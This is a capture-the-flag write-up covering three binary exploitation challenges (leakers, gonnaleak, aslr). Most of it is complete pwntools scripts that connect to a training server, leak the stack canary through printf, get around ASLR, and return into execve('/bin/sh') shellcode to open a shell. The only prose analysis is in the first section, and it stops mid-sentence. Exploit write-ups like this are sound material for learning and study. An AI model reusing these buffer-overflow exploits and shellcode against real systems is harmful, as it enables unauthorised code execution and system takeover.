# leakers ![c](https://img.shields.io/badge/solved-success)
### Analysis
This challenge is again on a *buffer overflow* vulnerability, as we can immediately see from the disassembled source code on Ghidra. However, this time we can see through ```checksec ./leakers``` that a **canary** mitigation is enabled.

Btw we can easily bypass it by exploiting the fact that there is a printf in the code that, as we know, prints strings until it finds a nulla byte 0x00. Moreover, a canary typically starts with this nulla byte in order to XXXXXX

### Exploit
```python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
#ssh = ssh("acidburn", "192.168.56.103")
#r = ssh.process("./leakers")
#gdb.attach(r, """
#	b *0x000401200
#	c
#	""")

r = remote("training.jinblack.it", 2010)

input("wait")

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

r.send(shellcode)
time.sleep(0.1)

r.send("A"*105)
time.sleep(0.1)
r.recvuntil("> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("0x%x" % canary)

wheretojump = 0x00404080

payload = b"A" * 104 + p64(canary) + b"B"*8 + p64(wheretojump)

r.send(payload)
time.sleep(0.1)

r.interactive()
```


# gonnaleak ![c](https://img.shields.io/badge/solved-success)
### Analysis
### Exploit
```python
from pwn import *
import time

#context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['terminator', '-e']
#r = process("./gonnaleak")
#gdb.attach(r, """
#	c
#	""")

r = remote("training.jinblack.it", 2011)

input("wait")


shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
shellcode = shellcode.rjust(104, b"\x90")
#r.send(shellcode)
#time.sleep(0.1)

r.send("A"*(105))
time.sleep(0.1)
r.recvuntil("> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("0x%x" % canary)


r.send("A"*(136))
time.sleep(0.1)
r.recvuntil("> ")
r.recv(136)
wheretojump = u64(r.recv(6) + b"\x00"*2)
print("0x%x" % wheretojump)
wheretojump = wheretojump - 0x150
print("0x%x" % wheretojump)


#payload = b"A"*104 + p64(canary) + b"B"*8 + p64(wheretojump)
payload = shellcode + p64(canary) + b"B"*8 + p64(wheretojump)

r.send(payload)
time.sleep(0.1)

r.interactive()
```

# aslr ![c](https://img.shields.io/badge/solved-success)
### Analysis
### Exploit
```python
from pwn import *
import time
'''
context.terminal = ['tmux', 'splitw', '-h']
r = process("./aslr")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2012)

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
r.send(shellcode)
time.sleep(0.1)

r.send("B"*105)
time.sleep(0.1)
r.recvuntil("> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("canary 0x%x" % canary)

offset = 0x2005c0
r.send("A"*112)
time.sleep(0.1)
r.recvuntil("> ")
r.recv(112)
add = u64(r.recv(8) + b"\x00" + b"\x00") 
add = add + offset
payload = b"a"*104 + p64(canary) + b"b"*8 + p64(add)
r.send(payload)

r.interactive()
```
